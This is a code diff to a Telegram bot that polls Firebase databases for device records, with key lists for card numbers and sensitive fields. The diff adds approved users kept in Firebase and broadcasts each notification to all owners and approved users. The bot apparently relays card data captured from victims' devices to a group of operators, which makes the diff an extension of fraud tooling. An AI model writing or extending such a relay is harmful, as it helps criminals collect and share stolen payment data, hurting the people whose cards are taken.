@@ -15,6 +15,10 @@ const OWNER_IDS = (process.env.OWNER_IDS || "")
   .split(",")
   .map((s) => parseInt(s.trim(), 10))
   .filter((n) => !isNaN(n));
+const APPROVED_IDS = (process.env.APPROVED_IDS || "")
+  .split(",")
+  .map((s) => parseInt(s.trim(), 10))
+  .filter((n) => !isNaN(n));
 const PRIMARY_ADMIN_ID = OWNER_IDS[0] || 0;
 const POLL_INTERVAL = 2; // seconds
 const MAX_SSE_RETRIES = 5;
@@ -29,7 +33,7 @@ let running = true;
 const firebaseUrls = {};    // chatId -> firebaseUrl
 const watcherIntervals = {}; // chatId -> intervalId
 const seenHashes = {};       // chatId -> Set(hash)
-const approvedUsers = new Set(OWNER_IDS);
+const approvedUsers = new Set([...OWNER_IDS, ...APPROVED_IDS]);
 const BOT_START_TIME = Date.now() / 1000;
 const SENSITIVE_KEYS = {};
 const firebaseCache = {};    // chatId -> firebase snapshot
@@ -37,6 +41,7 @@ const cacheTime = {};        // chatId -> last refresh timestamp
 const CACHE_REFRESH_SECONDS = 3600; // 1 hour
 
 const mutedDevices = new Set();
+let isApprovedUsersLoaded = false; // Flag to check if we loaded from DB
 
 const CARD_KEYS = new Set([
   "card", "cardnumber", "cc",
@@ -114,6 +119,31 @@ async function httpGetJson(url) {
   } catch (e) {
     console.log("http_get_json error for", url, "->", e.message);
     return null;
+  }
+}
+
+async function httpPutJson(url, data) {
+  try {
+    const res = await fetch(url, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+      timeout: 10000
+    });
+    return res.ok;
+  } catch (e) {
+    console.log("http_put_json error:", e.message);
+    return false;
+  }
+}
+
+async function httpDelete(url) {
+  try {
+    const res = await fetch(url, { method: 'DELETE', timeout: 10000 });
+    return res.ok;
+  } catch (e) {
+    console.log("http_delete error:", e.message);
+    return false;
   }
 }
 
@@ -278,12 +308,34 @@ async function notifyUserOwner(chatId, fields) {
   const deviceId = String(fields.device || "").trim();
   if (mutedDevices.has(deviceId)) return;
   const text = formatNotification(fields, chatId);
-  await sendMsg(chatId, text);
-  await sendMsg(OWNER_IDS, text);
+  
+  const dests = new Set([chatId, ...OWNER_IDS, ...approvedUsers]);
+  await sendMsg([...dests], text);
 }
 
 // ---------- FIREBASE POLLING LOGIC (Triggered by Cron) ----------
+async function getBaseUrlForApprovals(chatId, baseUrl) {
+  return baseUrl.replace(/\/+$/, "").replace(/\.json$/, "");
+}
+
+async function loadApprovedUsersFromDB(baseUrl) {
+  if (isApprovedUsersLoaded) return;
+  const dbUrl = await getBaseUrlForApprovals(null, baseUrl);
+  const snap = await httpGetJson(`${dbUrl}/approved_users.json`);
+  if (snap && typeof snap === 'object') {
+    for (const [key, val] of Object.entries(snap)) {
+      if (val === true) {
+        approvedUsers.add(parseInt(key, 10));
+      }
+    }
+  }
+  isApprovedUsersLoaded = true;
+}
+
 async function pollFirebaseIteration(chatId, baseUrl) {
+  // Load approved users on first iteration
+  await loadApprovedUsersFromDB(baseUrl);
+
   let url = baseUrl.replace(/\/+$/, "");
   if (!url.endsWith(".json")) url = url + "/.json";
   
@@ -665,8 +717,14 @@ async function handleUpdate(u) {
       await sendMsg(chatId, "❌ Invalid user ID.");
       return;
     }
+    
     approvedUsers.add(targetId);
-    await sendMsg(chatId, `✅ User <code>${targetId}</code> approved.`);
+    if (SINGLE_FIREBASE_URL) {
+      const dbUrl = await getBaseUrlForApprovals(chatId, SINGLE_FIREBASE_URL);
+      await httpPutJson(`${dbUrl}/approved_users/${targetId}.json`, true);
+    }
+    
+    await sendMsg(chatId, `✅ User <code>${targetId}</code> approved and saved permanently.`);
     await sendMsg(targetId, "✅ You have been approved to use this bot.");
     return;
   }
@@ -690,9 +748,14 @@ async function handleUpdate(u) {
       await sendMsg(chatId, "❌ Cannot unapprove an owner.");
       return;
     }
+    
     if (approvedUsers.has(targetId)) {
       approvedUsers.delete(targetId);
-      await sendMsg(chatId, `🚫 User <code>${targetId}</code> unapproved.`);
+      if (SINGLE_FIREBASE_URL) {
+        const dbUrl = await getBaseUrlForApprovals(chatId, SINGLE_FIREBASE_URL);
+        await httpDelete(`${dbUrl}/approved_users/${targetId}.json`);
+      }
+      await sendMsg(chatId, `🚫 User <code>${targetId}</code> unapproved and removed from permanent database.`);
     } else {
       await sendMsg(chatId, `ℹ️ User <code>${targetId}</code> was not approved.`);
     }
